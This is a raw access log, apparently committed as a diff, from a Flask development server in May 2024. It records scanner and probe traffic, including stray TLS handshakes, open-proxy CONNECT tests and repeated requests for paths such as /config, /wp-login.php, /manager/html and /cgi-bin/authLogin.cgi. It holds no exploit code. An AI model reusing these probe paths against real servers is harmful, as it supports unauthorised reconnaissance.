+185.216.71.4 - - [08/May/2024 19:47:23] code 400, message Bad request version ("\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+185.216.71.4 - - [08/May/2024 19:47:23] "\x16\x03\x01\x01)\x01\x00\x01%\x03\x03\x12Ì\x8e;\x9e\x94\x850-\x1aÎ&%ÓíT\x9f0\x12rg\x10Ì<Ü ßñ©Ü\x14j D[\x98Õ×\x05ùY\x16±a°aè\x08y\x95/Û\x95h\x01«:½R\x97\x93þ¶a\x1d\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+206.168.32.3 - - [08/May/2024 19:51:16] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [08/May/2024 19:51:19] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [08/May/2024 19:51:19] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [08/May/2024 19:51:19] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+107.170.244.30 - - [08/May/2024 20:21:51] code 400, message Bad request syntax ('MGLNDD_62.68.147.97_8081')
+107.170.244.30 - - [08/May/2024 20:21:51] "MGLNDD_62.68.147.97_8081" HTTPStatus.BAD_REQUEST -
+87.121.69.52 - - [08/May/2024 23:04:19] "CONNECT google.com:443 HTTP/1.1" 404 -
+205.210.31.202 - - [09/May/2024 00:29:47] "GET / HTTP/1.1" 404 -
+91.122.53.111 - - [09/May/2024 00:55:34] "GET /wp-login.php HTTP/1.1" 404 -
+91.92.251.254 - - [09/May/2024 01:56:00] "CONNECT 45.61.137.126:7227 HTTP/1.1" 404 -
+165.154.51.193 - - [09/May/2024 03:26:55] "GET / HTTP/1.1" 404 -
+165.154.51.193 - - [09/May/2024 03:26:56] code 400, message Bad request version ('À\x13À')
+165.154.51.193 - - [09/May/2024 03:26:56] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x14Bþõ480\x95È«2*+\x91@ìû\x86ÿÇ9Ú±77pl\x94\x81\x8fÊ¹ \x0b¤MÄn×Úcö¶Ç%·ÑõI¼ánA\x18\x17O\x12\x18ènû6ßèÈ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+165.154.51.193 - - [09/May/2024 03:26:58] code 400, message Bad request version ('À\x13À')
+165.154.51.193 - - [09/May/2024 03:26:58] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03&ÿä\x1d\x0búþ\x9dXïQN\x0bÜk\x04\x80.ÉÃW~\x0c\x1a§{x%òÐ\x87\x9a \x01F\x9bù»áÑ´f\x02îËaüT\x98¶âHäO\x8b¯ÿ.¶\x8e\x82\x8e¦îc\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+165.154.51.193 - - [09/May/2024 03:27:00] code 400, message Bad request version ('UGÞøQX8IÇý¶¤-f\x12w¨\x00')
+165.154.51.193 - - [09/May/2024 03:27:00] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ï\x89\x07AI ¯=;0©aíóx©þn9\x03nÂW\x82\x84«LÀÇ¶\x00g UGÞøQX8IÇý¶¤-f\x12w¨\x00" HTTPStatus.BAD_REQUEST -
+165.154.51.193 - - [09/May/2024 03:27:00] code 400, message Bad HTTP/0.9 request type ('t3')
+165.154.51.193 - - [09/May/2024 03:27:00] "t3 12.1.2" HTTPStatus.BAD_REQUEST -
+152.32.129.154 - - [09/May/2024 03:29:28] "GET / HTTP/1.1" 404 -
+152.32.129.154 - - [09/May/2024 03:29:29] "GET /favicon.ico HTTP/1.1" 404 -
+152.32.129.154 - - [09/May/2024 03:29:29] "GET /sitemap.xml HTTP/1.1" 404 -
+152.32.129.154 - - [09/May/2024 03:29:29] "GET /robots.txt HTTP/1.1" 404 -
+94.156.8.70 - - [09/May/2024 03:49:45] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 04:26:33] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 04:26:36] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 04:26:37] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [09/May/2024 04:26:37] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+87.121.69.52 - - [09/May/2024 05:12:24] "CONNECT google.com:443 HTTP/1.1" 404 -
+141.98.11.79 - - [09/May/2024 05:48:10] "CONNECT google.com:443 HTTP/1.1" 404 -
+83.97.73.245 - - [09/May/2024 07:06:31] "GET /jars HTTP/1.1" 404 -
+154.212.141.172 - - [09/May/2024 07:14:17] "GET / HTTP/1.1" 404 -
+137.184.174.92 - - [09/May/2024 07:18:20] "GET / HTTP/1.1" 404 -
+137.184.174.92 - - [09/May/2024 07:18:20] "GET /login HTTP/1.1" 404 -
+198.235.24.200 - - [09/May/2024 07:30:50] "GET / HTTP/1.0" 404 -
+198.235.24.237 - - [09/May/2024 07:38:22] code 400, message Bad request version ('À\x13À')
+198.235.24.237 - - [09/May/2024 07:38:22] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03T\x12÷èW\x11dO\x08ø#3¬3®\x8a±>\x05$YÞÉ®î\x09÷LÈ\x14Ç^ ë+ý4æ\x8bÄüÓ #Ï\x8d&\x92»ô}\x83y'«b4\x16³cæOãå³\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.237 - - [09/May/2024 07:38:22] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x9dJÏrl<\x16Û\x9f^')
+198.235.24.237 - - [09/May/2024 07:38:22] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x9dJÏrl<\x16Û\x9f^\x85t9m" HTTPStatus.BAD_REQUEST -
+184.105.247.195 - - [09/May/2024 10:48:57] code 400, message Bad request version ('À\x14À')
+184.105.247.195 - - [09/May/2024 10:48:57] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03éËµ©\x9aEËEè¶\x03® \x82\x16\x9b\x93ñ§CÊ\x0có\x9fÈ,úÍ*?ú¥\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+192.241.207.62 - - [09/May/2024 10:51:15] "GET / HTTP/1.1" 404 -
+65.49.1.78 - - [09/May/2024 11:11:56] "GET / HTTP/1.1" 404 -
+65.49.1.77 - - [09/May/2024 11:12:18] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.1.77 - - [09/May/2024 11:12:26] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.1.72 - - [09/May/2024 11:12:37] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+87.121.69.52 - - [09/May/2024 11:23:29] "CONNECT google.com:443 HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 13:01:35] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 13:01:39] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 13:01:39] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [09/May/2024 13:01:39] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+199.45.154.53 - - [09/May/2024 13:26:13] "GET / HTTP/1.1" 404 -
+199.45.154.53 - - [09/May/2024 13:26:28] "GET / HTTP/1.1" 404 -
+199.45.154.53 - - [09/May/2024 13:26:31] code 505, message Invalid HTTP version (2.0)
+199.45.154.53 - - [09/May/2024 13:26:31] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.41 - - [09/May/2024 14:28:03] "GET / HTTP/1.1" 404 -
+167.94.138.41 - - [09/May/2024 14:28:08] "GET / HTTP/1.1" 404 -
+167.94.138.41 - - [09/May/2024 14:28:08] code 505, message Invalid HTTP version (2.0)
+167.94.138.41 - - [09/May/2024 14:28:08] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+206.168.32.3 - - [09/May/2024 15:52:56] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 15:52:59] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [09/May/2024 15:52:59] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [09/May/2024 15:52:59] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+185.216.71.4 - - [09/May/2024 16:23:00] "CONNECT pro.ip-api.com:443 HTTP/1.1" 404 -
+185.216.71.4 - - [09/May/2024 16:23:00] code 400, message Bad request version ("{z\x84^\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+185.216.71.4 - - [09/May/2024 16:23:00] "\x16\x03\x01\x01)\x01\x00\x01%\x03\x03UHY\x85ìGi\x08\x94£N¾õ-Ï\x0fI\x15\x84X\x88\x19{\x10/Æ¹ÿ\x9c«õ) ëî\x91ü5ýeO\x90Î\x18â\x15\x03¬Ã\x1bc¤\x8f§\x13o+&©R\x09{z\x84^\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+87.121.69.52 - - [09/May/2024 17:12:51] "CONNECT google.com:443 HTTP/1.1" 404 -
+83.97.73.245 - - [09/May/2024 17:15:30] "GET /jars HTTP/1.1" 404 -
+95.214.27.7 - - [09/May/2024 17:19:14] "GET /config HTTP/1.1" 404 -
+141.98.11.79 - - [09/May/2024 19:29:07] "CONNECT google.com:443 HTTP/1.1" 404 -
+115.231.78.3 - - [09/May/2024 20:10:43] "GET / HTTP/1.1" 404 -
+115.231.78.3 - - [09/May/2024 20:10:45] "GET / HTTP/1.1" 404 -
+115.231.78.3 - - [09/May/2024 20:10:47] "GET /favicon.ico HTTP/1.1" 404 -
+115.231.78.3 - - [09/May/2024 20:10:48] "GET /robots.txt HTTP/1.1" 404 -
+207.167.67.66 - - [09/May/2024 20:28:09] "CONNECT www.google.com:443 HTTP/1.1" 404 -
+205.210.31.134 - - [09/May/2024 21:43:03] code 400, message Bad request version ('À\x13À')
+205.210.31.134 - - [09/May/2024 21:43:03] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03@3Ð\x13'Äl¸3ä\x1d\x0b\x9d×\x9bS`YÅ\x0b[ê~~ªFîÀ¯v\x8ej àä\x83Wz\x9f2Î ÔB¿\x7f_?èhÍ¨@¿\x8døn\x9e\x920xCÀ=\x8e\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+205.210.31.134 - - [09/May/2024 21:43:04] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.134 - - [09/May/2024 21:43:04] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03j\x00\x9c\x0f¶ \x03ßÎ\x17\x9f7T©óH°\x92§W;Ñ?È«\x06âø« ¹\x81\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+87.121.69.52 - - [09/May/2024 23:22:28] "CONNECT google.com:443 HTTP/1.1" 404 -
+139.59.37.187 - - [10/May/2024 01:18:08] "GET /aaa9 HTTP/1.1" 404 -
+139.59.37.187 - - [10/May/2024 01:18:09] "GET /aab8 HTTP/1.1" 404 -
+139.59.37.187 - - [10/May/2024 01:18:10] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 01:21:14] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 01:21:17] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 01:21:17] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [10/May/2024 01:21:17] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+199.45.154.68 - - [10/May/2024 02:18:18] "GET / HTTP/1.1" 404 -
+199.45.154.68 - - [10/May/2024 02:18:22] "GET / HTTP/1.1" 404 -
+199.45.154.68 - - [10/May/2024 02:18:23] code 505, message Invalid HTTP version (2.0)
+199.45.154.68 - - [10/May/2024 02:18:23] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+94.156.71.233 - - [10/May/2024 03:01:44] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
+91.122.53.111 - - [10/May/2024 04:43:40] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 04:55:44] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 04:55:48] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 04:55:48] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [10/May/2024 04:55:48] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+87.121.69.52 - - [10/May/2024 05:13:11] "CONNECT google.com:443 HTTP/1.1" 404 -
+45.147.250.222 - - [10/May/2024 05:16:01] code 400, message Bad request syntax ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03E\x18\x86%O>&èÏ\x92ìä\x80é·5æL@zÙØÅÿ´')
+45.147.250.222 - - [10/May/2024 05:16:01] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03E\x18\x86%O>&èÏ\x92ìä\x80é·5æL@zÙØÅÿ´" HTTPStatus.BAD_REQUEST -
+172.105.128.13 - - [10/May/2024 06:52:50] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+172.105.128.13 - - [10/May/2024 06:52:50] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x00\x12ìb¿\x9c" HTTPStatus.BAD_REQUEST -
+45.33.109.17 - - [10/May/2024 07:08:50] "GET / HTTP/1.1" 404 -
+172.104.11.46 - - [10/May/2024 07:09:03] "GET / HTTP/1.1" 404 -
+192.241.212.45 - - [10/May/2024 07:37:47] code 400, message Bad request syntax ('MGLNDD_62.68.147.97_8081')
+192.241.212.45 - - [10/May/2024 07:37:47] "MGLNDD_62.68.147.97_8081" HTTPStatus.BAD_REQUEST -
+172.233.16.61 - - [10/May/2024 08:16:06] "GET / HTTP/1.0" 404 -
+172.233.16.73 - - [10/May/2024 08:16:07] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 -
+172.233.16.73 - - [10/May/2024 08:16:07] "GET /v2/_catalog HTTP/1.1" 404 -
+172.233.16.73 - - [10/May/2024 08:16:07] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 -
+198.199.100.7 - - [10/May/2024 08:52:28] "GET /manager/text/list HTTP/1.1" 404 -
+207.167.67.66 - - [10/May/2024 09:16:09] "CONNECT www.google.com:443 HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 10:01:04] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 10:01:07] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [10/May/2024 10:01:08] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [10/May/2024 10:01:08] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8081
+ * Running on http://62.68.147.97:8081
+Press CTRL+C to quit
+95.214.27.7 - - [13/May/2024 19:00:44] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 19:17:41] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 19:29:43] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 19:45:40] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 19:59:23] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 20:20:50] "GET /config HTTP/1.1" 404 -
+91.122.53.111 - - [13/May/2024 20:25:49] "GET /favicon.ico HTTP/1.1" 404 -
+91.122.53.111 - - [13/May/2024 20:25:51] "GET /favicon.ico HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 20:27:45] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 20:47:06] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 21:01:20] "GET /config HTTP/1.1" 404 -
+87.121.69.52 - - [13/May/2024 21:09:17] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 21:15:36] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 21:34:50] "GET /config HTTP/1.1" 404 -
+206.168.32.3 - - [13/May/2024 21:50:22] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [13/May/2024 21:50:25] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [13/May/2024 21:50:25] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [13/May/2024 21:50:25] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [13/May/2024 21:50:45] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 21:59:20] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 22:19:46] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 22:34:23] "GET /config HTTP/1.1" 404 -
+198.235.24.161 - - [13/May/2024 22:36:54] "GET / HTTP/1.0" 404 -
+95.214.27.7 - - [13/May/2024 22:48:23] "GET /config HTTP/1.1" 404 -
+198.235.24.237 - - [13/May/2024 22:49:57] code 400, message Bad request version ('À\x13À')
+198.235.24.237 - - [13/May/2024 22:49:57] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03gËkQby\x94ê\x05õWì1\\\x14TÏI}\x071;F­¡Àà0I¬ræ ,Ìô\x99ÑzBºë}±h_\x85\x06Q\x1e*\x85\x1cÂ\x02J\x0fàf\x1c6ð6Ð\x17\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+198.235.24.237 - - [13/May/2024 22:49:57] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03j|CLK@NÜ½H¼')
+198.235.24.237 - - [13/May/2024 22:49:57] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03j|CLK@NÜ½H¼" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [13/May/2024 23:05:06] "GET /config HTTP/1.1" 404 -
+198.235.24.89 - - [13/May/2024 23:20:04] "GET / HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 23:25:46] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 23:33:46] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [13/May/2024 23:55:12] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 00:05:37] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 00:22:59] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 00:38:09] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 00:57:55] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 01:10:53] "GET /config HTTP/1.1" 404 -
+80.76.49.130 - - [14/May/2024 01:15:31] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 01:24:01] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 01:44:22] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 02:00:15] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 02:15:35] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 02:25:06] "GET /config HTTP/1.1" 404 -
+212.192.158.69 - - [14/May/2024 02:42:05] "GET / HTTP/1.1" 404 -
+212.192.158.69 - - [14/May/2024 02:43:42] "GET / HTTP/1.1" 404 -
+212.192.158.69 - - [14/May/2024 02:43:42] "GET /favicon.ico HTTP/1.1" 404 -
+141.98.11.179 - - [14/May/2024 02:44:37] "CONNECT www.bing.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 02:48:31] "GET /config HTTP/1.1" 404 -
+162.142.125.115 - - [14/May/2024 02:50:31] "GET / HTTP/1.1" 404 -
+162.142.125.115 - - [14/May/2024 02:50:36] "GET / HTTP/1.1" 404 -
+162.142.125.115 - - [14/May/2024 02:50:36] code 505, message Invalid HTTP version (2.0)
+162.142.125.115 - - [14/May/2024 02:50:36] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 02:58:46] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 03:11:46] "GET /config HTTP/1.1" 404 -
+87.121.69.52 - - [14/May/2024 03:13:50] "CONNECT google.com:443 HTTP/1.1" 404 -
+167.248.133.177 - - [14/May/2024 03:29:57] "GET / HTTP/1.1" 404 -
+167.248.133.177 - - [14/May/2024 03:30:00] "GET / HTTP/1.1" 404 -
+167.248.133.177 - - [14/May/2024 03:30:01] code 505, message Invalid HTTP version (2.0)
+167.248.133.177 - - [14/May/2024 03:30:01] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 03:35:25] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 03:50:31] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 03:58:38] "GET /config HTTP/1.1" 404 -
+65.49.20.112 - - [14/May/2024 04:08:51] "GET / HTTP/1.1" 404 -
+65.49.20.112 - - [14/May/2024 04:09:24] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.20.108 - - [14/May/2024 04:09:47] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.20.88 - - [14/May/2024 04:10:09] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 04:16:08] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 04:36:14] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 04:51:19] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 05:01:26] "GET /config HTTP/1.1" 404 -
+46.101.72.12 - - [14/May/2024 05:02:47] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03¾\x15')
+46.101.72.12 - - [14/May/2024 05:02:47] "\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03¾\x15\x1cÊ'WEùßEÙ&Î®t;PH\x95Do´øýpÒÔr\x89tþ=\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [14/May/2024 05:23:36] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 05:37:19] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 05:49:24] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 06:06:17] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 06:24:48] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 06:38:11] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 06:54:54] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 07:10:05] "GET /config HTTP/1.1" 404 -
+198.199.97.24 - - [14/May/2024 07:17:08] "GET /manager/html HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 07:23:32] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 07:37:07] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 07:54:06] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 08:10:58] "GET /config HTTP/1.1" 404 -
+167.94.146.49 - - [14/May/2024 08:21:45] "GET / HTTP/1.1" 404 -
+167.94.146.49 - - [14/May/2024 08:21:48] "GET / HTTP/1.1" 404 -
+167.94.146.49 - - [14/May/2024 08:21:49] code 505, message Invalid HTTP version (2.0)
+167.94.146.49 - - [14/May/2024 08:21:49] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 08:26:31] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 08:40:40] "GET /config HTTP/1.1" 404 -
+87.121.69.52 - - [14/May/2024 08:49:20] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 08:55:51] "GET /config HTTP/1.1" 404 -
+141.98.11.79 - - [14/May/2024 09:03:30] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 09:09:07] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 09:20:39] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 09:38:11] "GET /config HTTP/1.1" 404 -
+83.97.73.245 - - [14/May/2024 09:38:53] "GET /jars HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 09:55:27] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 10:09:10] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 10:26:28] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 10:40:03] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 10:51:55] "GET /config HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 10:58:15] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 10:58:18] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 10:58:18] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [14/May/2024 10:58:18] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 11:06:55] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 11:23:59] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 11:36:46] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 11:59:05] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 12:13:41] "GET /config HTTP/1.1" 404 -
+167.94.145.106 - - [14/May/2024 12:16:13] "GET / HTTP/1.1" 404 -
+167.94.145.106 - - [14/May/2024 12:16:18] "GET / HTTP/1.1" 404 -
+167.94.145.106 - - [14/May/2024 12:16:18] code 505, message Invalid HTTP version (2.0)
+167.94.145.106 - - [14/May/2024 12:16:18] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 12:22:49] "GET /config HTTP/1.1" 404 -
+162.142.125.215 - - [14/May/2024 12:25:18] "GET / HTTP/1.1" 404 -
+162.142.125.215 - - [14/May/2024 12:25:22] "GET / HTTP/1.1" 404 -
+162.142.125.215 - - [14/May/2024 12:25:22] code 505, message Invalid HTTP version (2.0)
+162.142.125.215 - - [14/May/2024 12:25:22] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 12:43:47] "GET /config HTTP/1.1" 404 -
+184.105.139.68 - - [14/May/2024 12:49:22] code 400, message Bad request version ('À\x14À')
+184.105.139.68 - - [14/May/2024 12:49:22] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x18fôCb£\x13¸\x9b\x91\x9dW\x0c\x8d\x1d\x00JBí±Ç,·§äby\x93aWOÉ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [14/May/2024 12:54:55] "GET /config HTTP/1.1" 404 -
+162.243.142.68 - - [14/May/2024 13:04:46] code 400, message Bad request syntax ('MGLNDD_62.68.147.97_8081')
+162.243.142.68 - - [14/May/2024 13:04:46] "MGLNDD_62.68.147.97_8081" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [14/May/2024 13:15:32] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 13:39:17] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 13:59:22] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 14:13:31] "GET /config HTTP/1.1" 404 -
+172.233.13.82 - - [14/May/2024 14:25:34] "GET / HTTP/1.1" 404 -
+172.233.13.82 - - [14/May/2024 14:25:35] "GET /favicon.ico HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 14:32:23] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 14:40:39] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 15:00:31] "GET /config HTTP/1.1" 404 -
+94.156.66.83 - - [14/May/2024 15:08:24] "CONNECT 45.61.137.126:7227 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 15:10:01] "GET /config HTTP/1.1" 404 -
